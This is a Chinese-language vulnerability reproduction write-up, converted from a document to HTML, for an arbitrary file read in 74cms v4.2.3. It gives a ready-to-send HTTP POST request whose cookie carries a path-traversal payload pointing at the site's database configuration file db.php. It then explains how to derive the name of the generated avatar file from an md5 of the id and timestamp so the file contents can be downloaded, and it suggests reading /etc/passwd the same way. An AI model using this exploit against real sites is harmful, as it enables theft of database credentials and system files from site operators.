<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>74cms v4.2.3任意文件读取</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><p>74cms v4.2.3</p><h2>三、复现过程</h2><p>先尝试读取 db.php，向服务器post如下数据</p><p>POST /index.php?m=&amp;c=members&amp;a=register HTTP/1.1<br />Host: www.0-sec.org<br />User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 <br />Accept-Encoding: gzip, deflate<br />Accept: */*<br />Connection: keep-alive<br />Cookie: members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php; members_bind_info[type]=qq; members_uc_info[password]=xcxmiku; members_uc_info[uid]=123456; members_uc_info[username]=xcxmiku<br />Content-Type: application/x-www-form-urlencoded<br /><br />ajax=1&amp;reg_type=2&amp;utype=2&amp;org=bind&amp;ucenter=bind</p><p>会返回如下数据</p><p>1.png</p><p>在/data/upload/avatar/年月/日文件夹下 会生成一张图片</p><p>2.png</p><p>这张图片的名称由id和时间戳的md5值构成，我们可以将Burp Suite上返回的时间转换为时间戳</p><p>3.png</p><p>不过这个时间可能会有误差，如果不行就把时间+-10</p><p>我post的id为654321，获取的时间戳为1571659588，将他们连在一起进行md5加密</p><p>4.png</p><p>成功获取图片名，然后访问</p><p>https://www.0-sec.org/data/upload/avatar/1910/21/9aaa3653bf6ec9491bc002b52521962c.jpg </p><p>保存该图片用文本打开就是 db.php 的内容。</p><h6>PS:</h6><p>使用post提交，参数如下</p><p>5.png</p><p>在Header可获取到时间戳</p><p>6.png</p><h3>可能会遇到的问题</h3><h6>post数据返回unicode编码</h6><p>因为名称，密码，ID等内容格式不对或重复会出现这种情况，将unicode编码进行解码，按提示修改即可。</p><h6>读取其他文件</h6><p>../../../../Application/Common/Conf/db.php</p><p>是读取db.php，如果想读取根目录可以构造</p><p>../../../../../../../../etc/passwd</p><h6>时间戳问题</h6><p>服务器返回的时间，服务器返回的是GMT格林威治标准时间，没有加上时区，只记录分秒即可</p></body></html>